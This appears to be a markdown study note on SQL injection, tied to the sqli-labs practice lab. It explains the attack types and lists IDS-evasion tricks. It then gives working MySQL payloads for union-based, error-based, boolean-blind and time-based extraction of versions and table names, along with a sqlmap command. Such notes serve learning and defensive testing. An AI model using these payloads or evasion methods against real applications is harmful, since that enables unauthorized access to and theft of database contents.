## SQL Injection Attack
`` SQL injection (SQLi) is an application security weakness that allows attackers to control an application’s database – letting them access or delete data, change an application’s data-driven behavior, and do other undesirable things – by tricking the application into sending unexpected SQL commands. ``

## Types of SQL Injection (SQLi)
### In-band SQLi (Classic SQLi) - an attacker is able to use the same communication channel to both launch the attack and gather results.
``Error-based SQLi - relies on error messages thrown by the database server to obtain information about the structure of the database.``

``Union-based SQLi - leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.``

### Inferential SQLi (Blind SQLi) - no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as “blind SQL Injection attacks”)
``Blind-boolean-based SQLi - relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result.``

``Blind-time-based SQLi - relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding ``

### Out-of-band SQLi -  an attacker is unable to use the same channel to launch the attack and gather results

### Evasion Technique

Use encryption.

Obfuscate string to avoid pattern matching.

Use Concatenation to confuse the IDS.

Use encoding like ASCII encoding, hexadecimal encoding to avoid detection.

Insert inline comments between query.


### [Audi 1 Lab](https://github.com/Audi-1/sqli-labs)
### [Audi 1 Lab Explaination](https://www.youtube.com/playlist?list=PLkiAz1NPnw8qEgzS7cgVMKavvOAdogsro)
### [Useful Link](http://index-of.es/Varios-2/Advanced%20SQL%20Injection.pdf)


Union Based

```
order by 
union select
group_concat(table_name) from information_schema.tables where table_schema=database()
group_concat(column_name) from information_schema.columns where table_name='table_name'
group_concat(data) from table_name
```
Error Based
```
# Intro 

SELECT count(*) from information_schema.tables;
SELECT rand();
SELECT floor(1.5);
select 1 from y;
select count(*),username from users group by username;

#Variable
SELECT count(*),CONCAT((SELECT @@version),0x3a,rand()) x FROM information_schema.tables group by x;
SELECT @x;
######
SELECT count(*),CONCAT((SELECT @@version),0x3a,floor(rand()*2)) x FROM information_schema.tables group by x;
SELECT @x;

# Version
AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)

# Table
AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT (table_name) from information_schema.tables where table_schema=database() limit 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)
```
Boolean Based Blind
sqlmap -r test.txt -p search 
```
# Intro
select substr('abcde',1,1);
select ascii('a');
select ascii(substr(@@version,1,1));

# True or False
select ascii(substr(@@version,1,1)) < 50;
select ascii(substr(@@version,1,1)) < 40;
select ascii(substr(@@version,1,1)) = 49;

# Testing
1 and 1=1 -> True
1 and 1=2 -> False

# Version
and ascii(substr(@@version,1,1)) = 49 -> First Character
and ascii(substring(version(),2,1)) = 48 -> Second Character

# Table
and ascii(substring((select concat(table_name) from information_schema.tables where table_schema=database()),1,1)) > 100



```
Time Based Blind
```
# Intro
SELECT IF(500<1000, "YES", "NO");
sleep(5);
and if(500<1000, sleep(5), NULL) -> Sleep
and if(500>1000, sleep(5), NULL) -> Do Not Sleep

# Version
and if(ascii(substr(version(),1,1)) = 49, sleep(5), NULL)

# Table
and if(ascii(substr((select concat(table_name) from information_schema.tables where table_schema=database()),1,1)) > 100, sleep(5), NULL)
```

Cheatsheet
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
```

### Noted by [konova](https://www.facebook.com/kon0va)

### Ref : 
- [acunetix](https://www.acunetix.com/websitesecurity/sql-injection2/)
- [lol Security](https://github.com/LunaM00n/Free-WebSec-Class/blob/master/Lectures/06.SQL%20Injection.md)


